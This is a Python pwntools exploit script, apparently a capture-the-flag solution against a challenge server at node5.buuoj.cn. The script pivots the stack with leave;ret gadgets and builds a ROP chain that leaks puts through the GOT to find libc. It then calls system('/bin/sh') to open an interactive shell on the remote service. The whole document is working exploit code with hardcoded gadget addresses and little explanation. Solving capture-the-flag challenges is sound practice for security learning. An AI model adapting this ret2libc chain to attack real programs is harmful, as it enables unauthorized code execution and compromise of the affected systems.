'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29562" 
filename = "./pwn"
elf = ELF(filename)
local_libc = "/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6"
remote_libc = "./libc.so.6"
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
pop_rdi_ret_addr = 0x0000000000401333
ret_addr = 0x000000000040101a
main_addr = 0x00000000004012AC
leave_addr = 0x00000000004012AA
buffer_overflow_size = 80

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'your name:', b'fa1c4')
    io.recvuntil(b'gift for you: ')
    rbp_addr = int(io.recv(14), 16) + 8 # migrating rbp_addr = buf_addr + 8 = input_buf_addr | 0x7ffcdadfcf88
    log.info('rbp address: {}'.format(hex(rbp_addr)))

    payload = cyclic(8) + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
    payload = payload.ljust(buffer_overflow_size, b'f')
    payload += p64(rbp_addr) + p64(leave_addr)
    io.sendafter(b'more infomation plz:', payload)

    io.recvuntil(b'see you soon!\n')
    puts_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
    log.info('puts address: {}'.format(hex(puts_addr)))

    libc.address = puts_addr - libc.sym['puts']
    binsh_addr = next(libc.search(b'/bin/sh\x00'))
    system_addr = libc.sym['system']

    io.sendlineafter(b'your name:', b'fa1c4')
    io.recvuntil(b'gift for you: ')
    rbp_addr = int(io.recv(14), 16) + 8 # migrating rbp_addr = buf_addr + 8 = input_buf_addr
    # B()
    payload = cyclic(8) + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
    payload = payload.ljust(buffer_overflow_size, b'f')
    payload += p64(rbp_addr) + p64(leave_addr)
    io.sendafter(b'more infomation plz:', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
